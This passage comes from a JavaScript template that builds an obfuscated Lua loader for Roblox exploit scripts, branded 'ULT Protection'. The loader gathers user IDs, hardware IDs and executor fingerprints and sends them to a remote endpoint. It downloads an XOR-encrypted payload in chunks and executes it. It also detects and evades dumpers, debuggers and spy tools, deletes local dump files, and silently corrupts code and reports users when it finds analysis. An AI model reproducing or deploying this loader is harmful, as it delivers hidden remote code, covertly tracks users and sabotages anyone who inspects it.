      -- Verify deletion
      pcall(function()
        if isfile and isfile(_wfPath) then
          delfile(_wfPath)
        end
      end)
      _wfOk = true
    end
  end)
  if _wfOk and fn then return fn, nil end
  
  -- ====== SECONDARY: writefile without makefolder (some executors) ======
  pcall(function()
    if not _wfOk and writefile and loadfile then
      local _wfPath2 = tostring(math.random(100000000, 999999999)) .. ".lua"
      writefile(_wfPath2, code)
      fn = loadfile(_wfPath2)
      pcall(function()
        if delfile then delfile(_wfPath2)
        elseif pcall then pcall(function() os.remove(_wfPath2) end) end
      end)
      _wfOk = true
    end
  end)
  if _wfOk and fn then return fn, nil end
  
  -- ====== TERTIARY: coroutine + clonefunction loadstring (legacy fallback) ======
  -- Only used if writefile/loadfile aren't available
  local co = coroutine.create(function()
    return ${v.cleanLS}(code)
  end)
  local ok, result1, result2 = coroutine.resume(co)
  if ok then
    fn = result1
    err = result2
  end
  if fn then return fn, nil end
  
  -- Method 2: Use xpcall with custom error handler
  local fn2
  xpcall(function()
    fn2 = ${v.cleanLS}(code)
  end, function() end)
  if fn2 then return fn2, nil end
  
  -- Method 3: direct pcall
  local fn3
  pcall(function()
    fn3 = ${v.cleanLS}(code)
  end)
  return fn3, err or "compile_failed"
end

local ${v.lsIntegrity} = tostring(${v.cleanLS})
local ${v.hookGuard} = {
  ls_ref = ${v.cleanLS},
  hg_ref = game.HttpGet,
  ts_ref = tostring,
  type_ref = type,
  pcall_ref = pcall,
  rawget_ref = rawget,
  rawset_ref = rawset,
  setfenv_ref = setfenv,
  getfenv_ref = getfenv,
}

-- ====== v9: RUNTIME ENTROPY COLLECTION ======
-- Collect live runtime data that can't exist outside a real game session
local ${v.runtimeEntropy} = {
  frames = {},
  startTick = tick(),
  startClock = os.clock(),
}

local ${v.entropyCollect} = function()
  -- v12.2: INSTANT entropy — no frame waits, zero latency
  pcall(function()
    ${v.runtimeEntropy}.frames[1] = os.clock() % 0.01
    ${v.runtimeEntropy}.frames[2] = (tick() % 0.01)
  end)
end

-- ====== v9: FETCH INTENT DETECTION ======
-- Flag sessions that fetch before RenderStepped begins
local ${v.intentCheck} = function()
  local rs = game:GetService("RunService")
  -- If we can't connect to RenderStepped, we're not in a real game
  local isReal = false
  local ok = pcall(function()
    if rs:IsClient() or rs:IsStudio() then
      isReal = true
    end
  end)
  if not ok or not isReal then return false end
  
  -- Check elapsed time since script start - if < 50ms, too fast (automated fetch)
  local elapsed = os.clock() - ${v.runtimeEntropy}.startClock
  if elapsed < 0.01 then
    -- Suspiciously fast - likely not a real execution
    -- v9: Don't block, silently degrade
    return false
  end
  return true
end

-- ====== PHASE 0.5: CANARY TRAP ======
local ${v.canaryTest} = function()
  local canaryCode = "local ${canaryId} = " .. tostring(math.random(100000,999999))
  local ok = pcall(function()
    local fn = loadstring(canaryCode)
    if fn then pcall(fn) end
  end)
  
  -- v10: Detect setclipboard hooking (main bypass vector)
  pcall(function()
    if setclipboard then
      if getupvalues then
        local ups = getupvalues(setclipboard)
        if ups and next(ups) ~= nil then
          _reportBypass("setclipboard_hooked", "setclipboard_has_upvalues")
          return false
        end
      end
      if hookcheck and hookcheck(setclipboard) then
        _reportBypass("setclipboard_hookcheck", "setclipboard_hookcheck_true")
        return false
      end
    end
    -- Also check toclipboard alias
    if toclipboard then
      if getupvalues then
        local ups = getupvalues(toclipboard)
        if ups and next(ups) ~= nil then
          _reportBypass("toclipboard_hooked", "toclipboard_has_upvalues")
          return false
        end
      end
    end
  end)
  
  -- v10: Detect if syn.request / request / http_request have been hooked for exfiltration
  pcall(function()
    local exfilFuncs = {"syn", "request", "http_request", "http"}
    for _, fname in ipairs(exfilFuncs) do
      local f = rawget(_G, fname)
      if f and type(f) == "function" and getupvalues then
        local ups = getupvalues(f)
        if ups then
          for k, uv in pairs(ups) do
            if type(uv) == "string" and (uv:find("webhook") or uv:find("discord") or uv:find("pastebin") or uv:find("hastebin")) then
              _reportBypass("exfil_webhook", "http_func_exfil_" .. fname)
            end
          end
        end
      end
    end
  end)
  
  local dumpFiles = {"script.lua", "dump.lua", "dumped.lua", "output.lua", "saved.lua", "source.lua"}
  for _, fname in ipairs(dumpFiles) do
    local hasFile = false
    pcall(function()
      if isfile and isfile(fname) then
        local content = ""
        pcall(function()
          if readfile then content = readfile(fname) end
        end)
        if content:find("${canaryId}") then
          hasFile = true
          pcall(function() if delfile then delfile(fname) end end)
        end
      end
    end)
    if hasFile then 
      _reportBypass("canary_dump_file", "canary_found_in_" .. fname)
      return false 
    end
  end
  
  pcall(function()
    if listfiles then
      local files = listfiles("") or {}
      for _, f in ipairs(files) do
        if f:find("%.lua$") then
          local content = ""
          pcall(function() if readfile then content = readfile(f) end end)
          if content:find("${canaryId}") then
            pcall(function() if delfile then delfile(f) end end)
            ${v.writeSink} = true
            _reportBypass("canary_dump_listfiles", "canary_found_in_" .. tostring(f))
          end
        end
      end
    end
  end)
  
  if ${v.writeSink} then return false end
  return true
end

-- ====== PHASE 0.6: WRITEFILE MONITOR ======
local ${v.antiWritefile} = function()
  local hookExists = false
  pcall(function()
    if hookfunction or detour_function or replace_closure then
      hookExists = true
    end
  end)
  
  if hookExists then
    if ${v.clonedLS} then
      local testStr = "return " .. tostring(math.random(1000000, 9999999))
      local globalResult, cloneResult
      pcall(function()
        local fn = loadstring(testStr)
        if fn then globalResult = fn() end
      end)
      pcall(function()
        local fn = ${v.cleanLS}(testStr)
        if fn then cloneResult = fn() end
      end)
      if globalResult ~= cloneResult then
        return false
      end
    end
  end
  
  if ${v.writeSink} then return false end
  return true
end

-- ====== PHASE 1: ANTI-HOOKFUNCTION DEFENSE (v9.0 Enhanced) ======
local ${v.antiHook} = function()
  if not ${v.canaryTest}() then return false end
  if not ${v.antiWritefile}() then return false end
  
  if not ${v.clonedLS} then
    if ${v.hookGuard}.rawget_ref(_G, "__original_loadstring") ~= nil then return false end
    if ${v.hookGuard}.rawget_ref(_G, "__old_loadstring") ~= nil then return false end
    if ${v.hookGuard}.rawget_ref(_G, "old") ~= nil then
      local oldVal = ${v.hookGuard}.rawget_ref(_G, "old")
      if ${v.hookGuard}.type_ref(oldVal) == "function" then
        local testOk, testFn = pcall(oldVal, "return 42")
        if testOk and ${v.hookGuard}.type_ref(testFn) == "function" then
          local testOk2, testResult = pcall(testFn)
          if testOk2 and testResult == 42 then return false end
        end
      end
    end
  end
  
  if ${v.hookGuard}.rawget_ref(_G, "script_dump_active") then return false end
  if ${v.hookGuard}.rawget_ref(_G, "ls_interceptor") then return false end
  if ${v.hookGuard}.rawget_ref(shared, "script_dump_active") then return false end
  if ${v.hookGuard}.rawget_ref(shared, "ls_interceptor") then return false end
  if ${v.hookGuard}.rawget_ref(_G, "printDetected") ~= nil then return false end
  if ${v.hookGuard}.rawget_ref(_G, "lastHookTime") ~= nil then return false end
  if ${v.hookGuard}.rawget_ref(_G, "hasShownMessage") ~= nil then return false end
  
  pcall(function()
    if getupvalues then
      local ups = getupvalues(print)
      if ups and next(ups) ~= nil then
        local hasBool = false
        local hasFunc = false
        for k, uv in pairs(ups) do
          if type(uv) == "boolean" then hasBool = true end
          if type(uv) == "function" then hasFunc = true end
        end
        if hasBool and hasFunc then ${v.writeSink} = true end
      end
    end
  end)
  if ${v.writeSink} then return false end
  
  if ${v.hookGuard}.rawget_ref(_G, "old_loadstring") ~= nil then return false end
  if ${v.hookGuard}.rawget_ref(_G, "orig_loadstring") ~= nil then return false end
  if ${v.hookGuard}.rawget_ref(_G, "real_loadstring") ~= nil then return false end
  if ${v.hookGuard}.rawget_ref(_G, "backup_loadstring") ~= nil then return false end
  
  return true
end

-- ====== PHASE 2: ANTI-ENVIRONMENT LOGGER DEFENSE (v9.0 Rewritten) ======
-- Completely rewritten for comprehensive coverage
local ${v.antiEnvLog} = function()
  -- Check 1: Known env logger globals (comprehensive list)
  local envLoggerSignals = {
    "OLSSA", "olssa", "runtime_log", "static_log", 
    "loadstring_logger", "script_dump", "dumpfunc",
    "logfile", "hooklog", "ls_hook", "string_dump_log",
    "env_logger", "environment_logger", "exec_logger",
    "threaded", "unveilr", "UnveilR",
    "hook_registry", "hooked_functions", "intercept_log",
    "function_hooks", "call_log", "exec_trace",
    "dump_output", "script_output", "captured_scripts",
    "logged_calls", "traced_funcs", "monitored_env",
    "deobf_active", "deobfuscator", "beautifier",
    "ast_dump", "bytecode_dump", "opcode_log",
    -- v9: Additional logger signatures
    "IY_LOADED", "SimpleSpy", "remotespy", "RemoteSpy",
    "ScriptDumper", "scriptdumper", "HttpSpy", "httpspy",
    "dex", "DEX_LOADED", "InfYield", "infiniteyield",
    "SENTINEL_LOADED", "synspy", "SynSpy",
    "hookfunction_log", "detour_log", "closure_log",
    "writefile_log", "appendfile_log",
    "getgc_dump", "gc_scan_log",
    "upvalue_log", "constant_log", "proto_log",
    "environment_dump", "env_dump", "fenv_log",
    "require_log", "module_log", "service_log",
    "network_log", "http_log", "request_log",
    "signal_log", "event_log", "connection_log",
    "metamethod_log", "metatable_log", "mt_log",
    "thread_log", "coroutine_log", "task_log",
    "instance_log", "property_log", "attribute_log",
  }
  
  for _, sig in ipairs(envLoggerSignals) do
    if ${v.hookGuard}.rawget_ref(_G, sig) ~= nil then return false end
    if ${v.hookGuard}.rawget_ref(shared, sig) ~= nil then return false end
  end
  
  -- Check 2: Detect hooked getfenv/setfenv
  if ${v.hookGuard}.type_ref(getfenv) ~= "function" then return false end
  if ${v.hookGuard}.type_ref(setfenv) ~= "function" then return false end
  
  -- Check 3: Metatables on _G (env loggers add __index/__newindex)
  local gMt = getmetatable(_G)
  if gMt then
    if ${v.hookGuard}.rawget_ref(gMt, "__index") or ${v.hookGuard}.rawget_ref(gMt, "__newindex") then
      return false
    end
    if ${v.hookGuard}.rawget_ref(gMt, "__call") then return false end
  end
  
  -- Check 4: Metatables on shared
  local sMt = getmetatable(shared)
  if sMt then
    if ${v.hookGuard}.rawget_ref(sMt, "__index") or ${v.hookGuard}.rawget_ref(sMt, "__newindex") then
      return false
    end
  end
  
  -- Check 5: Debug library hooks
  if ${v.hookGuard}.type_ref(${v.hookGuard}.rawget_ref(_G, "debug")) == "table" then
    local dbg = ${v.hookGuard}.rawget_ref(_G, "debug")
    if ${v.hookGuard}.rawget_ref(dbg, "sethook") then
      local ok, hookFn, mask, count = ${v.hookGuard}.pcall_ref(debug.gethook)
      if ok and hookFn then return false end
    end
    if ${v.hookGuard}.rawget_ref(dbg, "setmetatable_hook") then return false end
    if ${v.hookGuard}.rawget_ref(dbg, "hook_active") then return false end
    if ${v.hookGuard}.rawget_ref(dbg, "trace_calls") then return false end
  end
  
  -- Check 6: Detect hooked require (Lune-based loggers)
  if ${v.hookGuard}.rawget_ref(_G, "require") ~= nil then
    local req = ${v.hookGuard}.rawget_ref(_G, "require")
    if ${v.hookGuard}.type_ref(req) == "table" then return false end
  end
  
  -- v9 Check 7: Detect if writefile/appendfile have been wrapped
  pcall(function()
    if writefile then
      -- Check if writefile has upvalues (wrapped)
      if getupvalues then
        local ups = getupvalues(writefile)
        if ups and next(ups) ~= nil then
          -- writefile has been wrapped - likely logging
          ${v.writeSink} = true
        end
      end
    end
  end)
  if ${v.writeSink} then return false end
  
  -- v9 Check 8: Detect if HttpGet/HttpPost have been hooked
  pcall(function()
    if getupvalues then
      local hg = game.HttpGet
      if ${v.hookGuard}.type_ref(hg) == "function" then
        local ups = getupvalues(hg)
        if ups and next(ups) ~= nil then
          -- HttpGet has upvalues - may be wrapped
          -- Only flag if it has suspicious patterns
          for k, uv in pairs(ups) do
            if ${v.hookGuard}.type_ref(uv) == "function" then
              ${v.writeSink} = true
            end
          end
        end
      end
    end
  end)
  if ${v.writeSink} then return false end
  
  -- v9 Check 9: Detect if game:GetService has been hooked
  pcall(function()
    if getupvalues then
      local gs = game.GetService
      if ${v.hookGuard}.type_ref(gs) == "function" then
        local ups = getupvalues(gs)
        if ups and next(ups) ~= nil then
          ${v.writeSink} = true
        end
      end
    end
  end)
  if ${v.writeSink} then return false end
  
  -- Check 10: Verify our execution environment is clean
  local envKeys = {}
  local env = getfenv(1)
  if env ~= _G and env ~= nil then
    for k, _ in pairs(env) do
      envKeys[#envKeys+1] = k
    end
    if #envKeys > 50 then return false end
  end
  
  -- v9 Check 11: Detect if task.spawn/defer have been hooked (used by async loggers)
  pcall(function()
    if getupvalues and task and task.spawn then
      local ups = getupvalues(task.spawn)
      if ups and next(ups) ~= nil then
        ${v.writeSink} = true
      end
    end
  end)
  if ${v.writeSink} then return false end
  
  return true
end

-- ====== PHASE 3: ANTI-LOADSTRING INTERCEPT ======
local ${v.antiLogger} = function()
  if not ${v.clonedLS} then
    if ${v.hookGuard}.rawget_ref(_G, "loadstring") ~= nil and ${v.hookGuard}.rawget_ref(_G, "loadstring") ~= ${v.cachedLS} then
      return false
    end
  end
  local loggerSignals = {
    "loadstring_log", "ls_hook", "string_dump_log", "script_dump",
    "hooklog", "logfile", "dumpfunc", "savetofile"
  }
  for _, sig in ipairs(loggerSignals) do
    if ${v.hookGuard}.rawget_ref(_G, sig) ~= nil or ${v.hookGuard}.rawget_ref(shared, sig) ~= nil then
      return false
    end
  end
  return true
end

-- Anti-Decompile & Anti-SaveInstance
local ${v.antiDump} = function()
  local dangerousSignals = {
    "OLSSA", "olssa", "runtime_log", "static_log", 
    "loadstring_logger", "script_dump", "dumpfunc",
    "logfile", "hooklog", "ls_hook", "string_dump_log"
  }
  for _, sig in ipairs(dangerousSignals) do
    if ${v.hookGuard}.rawget_ref(_G, sig) ~= nil or ${v.hookGuard}.rawget_ref(shared, sig) ~= nil then
      return false
    end
  end
  return true
end

-- Anti-Debug
local ${v.antiDebug} = function(targetFunc)
  if ${v.hookGuard}.type_ref(${v.hookGuard}.rawget_ref(_G, "debug")) == "table" then
    local dbg = ${v.hookGuard}.rawget_ref(_G, "debug")
    if ${v.hookGuard}.rawget_ref(dbg, "getupvalues") or ${v.hookGuard}.rawget_ref(dbg, "getconstants") or ${v.hookGuard}.rawget_ref(dbg, "getprotos") then
      if ${v.hookGuard}.rawget_ref(dbg, "setmetatable_hook") or ${v.hookGuard}.rawget_ref(dbg, "hook_active") then
        return false
      end
    end
  end
  if ${v.hookGuard}.type_ref(${v.hookGuard}.rawget_ref(_G, "hookfunction")) == "function" then
    local origLS = ${v.hookGuard}.rawget_ref(_G, "__original_loadstring")
    if origLS ~= nil then return false end
  end
  return true
end

-- Anti-GC Scan (memory fragmentation)
local ${v.antiGC} = function(str)
  if ${v.hookGuard}.type_ref(str) ~= "string" or #str < 10 then return str end
  local chunks = {}
  local chunkSize = math.max(1, math.floor(#str / ${Math.floor(Math.random() * 5) + 3}))
  for i = 1, #str, chunkSize do
    chunks[#chunks + 1] = str:sub(i, math.min(i + chunkSize - 1, #str))
  end
  local result = table.concat(chunks)
  for i = 1, #chunks do chunks[i] = nil end
  return result
end

local ${v.memWipe} = function(t)
  if ${v.hookGuard}.type_ref(t) == "table" then
    for k in pairs(t) do t[k] = nil end
  end
end

-- ====== v9: DUMP POISONING ======
-- Instead of blocking, return subtly corrupted data
local ${v.dumpPoison} = false
local ${v.silentDegrade} = function()
  ${v.dumpPoison} = true
  -- Don't warn, don't kick - silently mark session as compromised
end

-- ====== v10: INSTANT BYPASS REPORT & GLOBAL BAN ======
-- When bypass is detected, report to server for instant global ban
local _bypassReported = false
local _reportBypass = function(reason, details)
  if _bypassReported then return end
  _bypassReported = true
  -- Fire report to server (fire-and-forget, non-blocking)
  local uid = "0"
  pcall(function()
    if ${v.player} and ${v.player}.UserId then
      uid = tostring(${v.player}.UserId)
    end
  end)
  local reportUrl = ${v.baseEndpoint} .. "?_report=bypass&uid=" .. uid .. "&reason=" .. tostring(reason or "unknown") .. "&details=" .. tostring(details or "")
  pcall(function()
    ${v.stealthFetch}(reportUrl)
  end)
  -- Also silently degrade the session
  ${v.dumpPoison} = true
end

-- ====== PHASE 4: SANDBOXED EXECUTION (v9.5 Enhanced) ======
local ${v.execSandbox} = function(code)
  -- v9.5: If dump poisoning active, corrupt the code subtly
  if ${v.dumpPoison} then
    code = code:gsub("(%d+)", function(n)
      if math.random() < 0.05 then
        return tostring(tonumber(n) + math.random(-3, 3))
      end
      return n
    end)
  end
  
  if not ${v.antiHook}() then
    _reportBypass("hook_in_sandbox", "hook_detected_at_exec")
    if ${v.dumpPoison} then
      local fn, err = ${v.indirectExec}(code)
      return fn, err
    end
    return nil, "hook_detected"
  end
  if not ${v.antiEnvLog}() then
    _reportBypass("env_logger_sandbox", "env_logger_at_exec")
    if ${v.dumpPoison} then
      local fn, err = ${v.indirectExec}(code)
      return fn, err
    end
    return nil, "env_logger_detected"
  end
  if not ${v.antiLogger}() then
    _reportBypass("logger_sandbox", "logger_at_exec")
    if ${v.dumpPoison} then
      local fn, err = ${v.indirectExec}(code)
      return fn, err
    end
    return nil, "logger_detected"
  end
  
  -- v9.5: Use indirect execution (coroutine-based) for clean path too
  local fn, err = ${v.indirectExec}(code)
  if not fn then return nil, err end
  return fn, nil
end

local ${v.shieldEnv} = function(func)
  local env = setmetatable({}, {
    __index = getfenv(0),
    __newindex = function(self, key, value)
      rawset(self, key, value)
    end,
    __metatable = "Protected"
  })
  setfenv(func, env)
  return func
end

local ${v.player} = game:GetService("Players").LocalPlayer
if not ${v.player} then
  ${v.player} = game:GetService("Players").PlayerAdded:Wait()
end

local ${v.envCheck} = function()
  local ok, result = ${v.hookGuard}.pcall_ref(function()
    local ps = game:GetService("Players")
    local rs = game:GetService("RunService")
    if not ps or not rs then return false end
    return rs:IsClient() or rs:IsStudio()
  end)
  return ok and result
end

if not ${v.envCheck}() then return end

-- v9: Collect runtime entropy BEFORE protection checks
${v.entropyCollect}()

-- v10: Collect execution DNA BEFORE protection checks
${v.dnaCollect}()

-- ====== v10: GC SENTINEL ======
-- Plant objects in the garbage collector that detect GC scanning tools
local ${v.gcSentinel} = setmetatable({}, {
  __gc = function(self)
    -- If this fires outside normal GC, someone is scanning
    pcall(function()
      if ${v.ghostArmed} then return end
      ${v.ghostArmed} = true
      -- Can't do much here, but flag it
    end)
  end,
  __tostring = function() return "table: 0x" .. string.rep("0", 8) end,
})
-- Make it weak so it CAN be collected
pcall(function()
  local weak = setmetatable({${v.gcSentinel}}, {__mode = "v"})
end)

-- ====== v10: STACK DEPTH VALIDATION ======
-- Legitimate loadstring execution has a specific call stack depth
-- Decompilers/debuggers add extra stack frames
local ${v.stackDepth} = 0
local ${v.stackCheck} = function()
  local depth = 0
  local info
  repeat
    depth = depth + 1
    info = debug and debug.info and debug.info(depth, "s") or nil
  until not info or depth > 20
  ${v.stackDepth} = depth
  -- Normal execution: 3-12 frames. Debugger: 15+
  if depth > 15 then
    _reportBypass("deep_stack", "stack_depth_" .. tostring(depth))
    return false
  end
  return true
end
pcall(${v.stackCheck})

-- ====== RUN ALL PROTECTION CHECKS ======
-- v10: Polymorphic order — different every time, impossible to predict
${(() => {
  const checks = [
    `if not ${v.antiHook}() then _reportBypass("hook_detected", "loadstring_hook") end`,
    `if not ${v.antiEnvLog}() then _reportBypass("env_logger", "environment_logger_detected") end`,
    `if not ${v.antiLogger}() then _reportBypass("logger", "loadstring_logger") end`,
    `if not ${v.antiDump}() then _reportBypass("dump_tool", "script_dump_active") end`,
    `if not ${v.antiDebug}() then _reportBypass("debug_hook", "debug_tool_detected") end`,
  ];
  // Shuffle
  for (let i = checks.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [checks[i], checks[j]] = [checks[j], checks[i]];
  }
  return checks.join('\n');
})()}

-- v9: Check fetch intent
if not ${v.intentCheck}() then
  _reportBypass("fetch_intent", "automated_fetch_no_game")
end

-- v10: Ghost trap verification — if the ghost block number was tampered with
if ${v.ghostArmed} then
  _reportBypass("ghost_trap_triggered", "ghost_id_${ghostId}")
end

-- Generate unique execution nonce
local ${v.nonce} = function()
  local hs = game:GetService("HttpService")
  local ok, guid = ${v.hookGuard}.pcall_ref(function()
    return hs:GenerateGUID(false)
  end)
  if ok and guid then return guid end
  return tostring(math.floor((os.clock() * 1000000) % 1000000000)) .. tostring(math.random(1, 1000000000))
end

-- Collect fingerprint data
local ${v.fingerprint} = function()
  local p = {}
  p.u = tostring(${v.player}.UserId)
  p.n = ${v.player}.Name
  p.t = tostring(os.time())
  p.r = "${executionNonce}" .. ${v.nonce}()
  p.g = tostring(game.GameId or 0)
  p.p = tostring(game.PlaceId or 0)
  local exFp = ""
  ${v.hookGuard}.pcall_ref(function()
    if identifyexecutor then
      exFp = tostring(identifyexecutor())
    elseif getexecutorname then
      exFp = tostring(getexecutorname())
    end
  end)
  p.ex = exFp
  -- v11: Collect HWID for hardware locking
  local hwidStr = ""
  ${v.hookGuard}.pcall_ref(function()
    if gethwid then
      hwidStr = tostring(gethwid())
    elseif getexecutorfingerprint then
      hwidStr = tostring(getexecutorfingerprint())
    elseif getdeviceid then
      hwidStr = tostring(getdeviceid())
    elseif syn and syn.hwid then
      hwidStr = tostring(syn.hwid())
    end
  end)
  p.hwid = hwidStr
  -- v9: Runtime entropy proof
  local frameSum = 0
  for _, dt in ipairs(${v.runtimeEntropy}.frames) do
    frameSum = frameSum + dt
  end
  p.entropy = tostring(math.floor(frameSum * 100000))
  p.nonce = "${serverNonce}"
  -- v10: Execution DNA hash
  p.dna = tostring(${v.dnaHash})
  -- v10: Quantum token half
  p.qt = "${quantumPair}"
  -- v10: Watermark ID for leak tracing
  p.wm = "${watermarkId}"
  -- v10: Stack depth for validation
  p.sd = tostring(${v.stackDepth})
  -- v10: Memory fingerprint
  p.mem = tostring(math.floor(${v.dnaMemory}))
  return p
end

-- Obfuscated token storage and reconstruction
-- v10: Polymorphic reconstruction — uses different decoding each time
local ${v.tokenParts} = {${obfuscatedParts.map(p => `"${p}"`).join(',')}}
local ${v.reconstruct} = function()
  local r = ""
  for i,p in ipairs(${v.tokenParts}) do
    local d = ""
    for j=1,#p,2 do
      local c = tonumber(p:sub(j,j+1),16)
      c = bit32.bxor(c, ((i-1) + math.floor((j-1)/2)) % 16)
      d = d .. string.char(c)
    end
    r = r .. d
  end
  return r
end

local ${v.isHex} = function(str)
  if ${v.hookGuard}.type_ref(str) ~= "string" then return false end
  if (#str % 2) ~= 0 then return false end
  return str:match("^[0-9a-fA-F]+$") ~= nil
end

local ${v.session} = "${sessionSecret}"
local fp = ${v.fingerprint}()
local tk = ${v.reconstruct}()

-- Wipe token parts from memory after reconstruction
${v.memWipe}(${v.tokenParts})

-- v10: Build request URL with DNA, quantum pair, and watermark
local url = ${v.baseEndpoint} .. "?slug=${slug}&uid=" .. fp.u .. "&ts=" .. fp.t .. "&tk=" .. tk .. "&ss=" .. ${v.session} .. "&gid=" .. fp.g .. "&pid=" .. fp.p .. "&r=" .. fp.r .. "&ex=" .. (fp.ex or "") .. "&hwid=" .. (fp.hwid or "") .. "&entropy=" .. (fp.entropy or "0") .. "&snonce=" .. fp.nonce .. "&dna=" .. fp.dna .. "&qt=" .. fp.qt .. "&wm=" .. fp.wm .. "&sd=" .. fp.sd .. "&mem=" .. fp.mem .. "&_=" .. tostring(tick())

-- XOR Decode
local ${v.hexBytes} = function(hex)
  local bytes = {}
  for i = 1, #hex, 2 do
    bytes[#bytes + 1] = tonumber(hex:sub(i, i+1), 16) or 0
  end
  return bytes
end

local ${v.xorBytes} = function(bytes, keyb)
  local out = table.create(#bytes)
  for i = 1, #bytes do
    out[i] = bit32.bxor(bytes[i], keyb[((i-1) % #keyb) + 1])
  end
  return out
end

local ${v.bytesToString} = function(bytes)
  local chars = table.create(#bytes)
  for i = 1, #bytes do chars[i] = string.char(bytes[i]) end
  return table.concat(chars)
end

-- v9: Generate decryption key with runtime entropy binding
local ks = "${slug}:" .. tk .. ":ULTv9:" .. fp.u .. ":" .. (fp.entropy or "0")
local kb = {}
for i = 1, #ks do
  kb[i] = string.byte(ks, i)
end

-- v12.2: Reduced decoy flood — 5 calls instead of 50 (moved post-execution for zero load delay)
local ${v.decoyFlood} = function()
  for _di = 1, 5 do
    local _code = "local _=" .. tostring(math.random(100000,999999))
    pcall(${v.cleanLS}, _code)
    _code = nil
  end
end

-- Re-verify protections before network request
if not ${v.antiHook}() then _reportBypass("pre_fetch_hook", "hook_before_network") end
if not ${v.antiEnvLog}() then _reportBypass("pre_fetch_env", "env_logger_before_network") end

-- v9.5: Re-verify loadstring integrity before fetch
if not ${v.verified} then _reportBypass("ls_unverified", "loadstring_integrity_failed") end
if ${v.hookcheckLS} and not ${v.clonedLS} then _reportBypass("ls_hooked_no_clone", "hookcheck_true_no_fallback") end

${options?.showConsoleFeedback ? `
local function ${v.junk5}(msg, pct)
  local barLen = 20
  local filled = math.floor(barLen * pct / 100)
  local empty = barLen - filled
  print("[ULT PROTECTION] [" .. string.rep("#", filled) .. string.rep("-", empty) .. "] " .. pct .. "% - " .. msg)
end

${v.junk5}("Scanning environment...", 0)

${v.junk5}("Verifying integrity...", 25)

${v.junk5}("Fetching payload...", 50)
` : ''}

local s, r = ${v.hookGuard}.pcall_ref(function()
  return ${v.stealthFetch}(url)
end)

if not s or not r then
  s, r = ${v.hookGuard}.pcall_ref(function()
    return ${v.cachedHG}(game, url)
  end)
end

if s and r then
  if r == "" then
    warn("Empty response")
    return
  end

  -- ====== POST-FETCH ANTI-HOOK CHECK ======
  if not ${v.antiHook}() then
    _reportBypass("post_fetch_hook", "hook_after_network_request")
  end

  -- v9.5: Re-check hookcheck after fetch (attacker might hook during network wait)
  pcall(function()
    if hookcheck and hookcheck(loadstring) and not ${v.clonedLS} then
      _reportBypass("post_fetch_ls_hook", "loadstring_hooked_post_fetch")
    end
    -- Also check if our cleanLS got swapped
    if hookcheck and hookcheck(${v.cleanLS}) then
      _reportBypass("cleanls_hooked", "clean_loadstring_compromised")
      -- cleanLS itself is hooked now! Try to recover
      pcall(function()
        if getoriginalfunction then
          ${v.cleanLS} = getoriginalfunction(${v.cleanLS})
        elseif restorefunction then
          restorefunction(${v.cleanLS})
        end
      end)
    end
  end)

  -- Handle refresh loader response
  if r:sub(1,2) == "--" then
    local rf, re = ${v.indirectExec}(r)
    if rf then return rf() end
    warn("Protection error")
    return
  end

  -- v10.2: CHUNKED ANTI-LOADSTRING-HOOK FORMAT
  if r:sub(1,6) == "ULT_C:" then
    local ${v.chunkHeaderEnd} = r:find("|", 1, true)
    if not ${v.chunkHeaderEnd} then warn("E:cf"); return end
    local ${v.chunkHeader} = r:sub(7, ${v.chunkHeaderEnd} - 1)
    local _ncStr, _sdStr = ${v.chunkHeader}:match("(%d+):(%d+)")
    local _numC = tonumber(_ncStr)
    local _seedC = tonumber(_sdStr)
    if not _numC or not _seedC then warn("E:ch"); return end

    local ${v.chunkData} = r:sub(${v.chunkHeaderEnd} + 1)
    r = nil

    local ${v.chunkParts} = {}
    local _ci = 1
    for _ch in ${v.chunkData}:gmatch("[^|]+") do
      ${v.chunkParts}[_ci] = _ch
      _ci = _ci + 1
    end
    ${v.chunkData} = nil

    -- Reproduce Fisher-Yates shuffle with same Lehmer PRNG
    local ${v.chunkIndices} = {}
    for i = 0, _numC - 1 do ${v.chunkIndices}[i] = i end
    local _ss = _seedC
    for i = _numC - 1, 1, -1 do
      _ss = (_ss * 16807) % 2147483647
      local j = _ss % (i + 1)
      ${v.chunkIndices}[i], ${v.chunkIndices}[j] = ${v.chunkIndices}[j], ${v.chunkIndices}[i]
    end

    local ${v.chunkResult} = {}
    for pos = 0, _numC - 1 do
      ${v.chunkResult}[${v.chunkIndices}[pos]] = ${v.chunkParts}[pos + 1]
    end
    ${v.chunkParts} = nil

    local _pieces = {}
    for origIdx = 0, _numC - 1 do
      local _chHex = ${v.chunkResult}[origIdx]
      if not _chHex or #_chHex == 0 then break end
      local _ck = ks .. ":C" .. tostring(origIdx) .. ":" .. tostring(_numC)
      local _ckb = {}
      for i = 1, #_ck do _ckb[i] = string.byte(_ck, i) end
      local _rb = ${v.hexBytes}(_chHex)
      local _db = ${v.xorBytes}(_rb, _ckb)
      _pieces[origIdx + 1] = ${v.bytesToString}(_db)
    end
    ${v.chunkResult} = nil

    local _assembled = table.concat(_pieces)
    _pieces = nil

${options?.showConsoleFeedback ? `    pcall(function()
      local function ultBar(msg, pct)
        local barLen = 20
        local filled = math.floor(barLen * pct / 100)
        local empty = barLen - filled
        print("[ULT PROTECTION] [" .. string.rep("#", filled) .. string.rep("-", empty) .. "] " .. pct .. "% - " .. msg)
      end
      ultBar("Chunks decrypted, executing...", 75)
      task.wait(0.05)
      ultBar("Script loaded successfully.", 100)
      local pName = ${v.player}.DisplayName or ${v.player}.Name
      print("[ULT PROTECTION] Welcome, " .. tostring(pName) .. ".")
      print("[ULT PROTECTION] Protected by ULT Protection v10.3 - Loadstring-Proof Shield")
    end)
` : ''}
    -- v12.2: Decoys moved post-execution for instant loading

    if ${v.dumpPoison} then
      _assembled = _assembled:gsub("(%d+)", function(n)
        if math.random() < 0.05 then
          return tostring(tonumber(n) + math.random(-3, 3))
        end
        return n
      end)
    end

    local ${v.execFunc}, _err = ${v.indirectExec}(_assembled)
    _assembled = nil

    -- v12.2: Decoys run AFTER execution (non-blocking)
    task.defer(${v.decoyFlood})

    if ${v.execFunc} then
      local _co = coroutine.create(function() return ${v.execFunc}() end)
      coroutine.resume(_co)
      ${v.execFunc} = nil
      _co = nil

      pcall(function()
        for i = 1, #kb do kb[i] = math.random(0, 255) end
        ${v.cleanLS} = nil
        ${v.cachedLS} = nil
        ${v.cachedHG} = nil
        ${v.hookGuard} = nil
        ${v.indirectExec} = nil
        ${v.antiHook} = nil
        ${v.antiEnvLog} = nil
        ${v.antiLogger} = nil
        ${v.antiDump} = nil
        ${v.antiDebug} = nil
        ${v.execSandbox} = nil
        ${v.dnaHash} = 0
        ${v.morphSeed} = 0
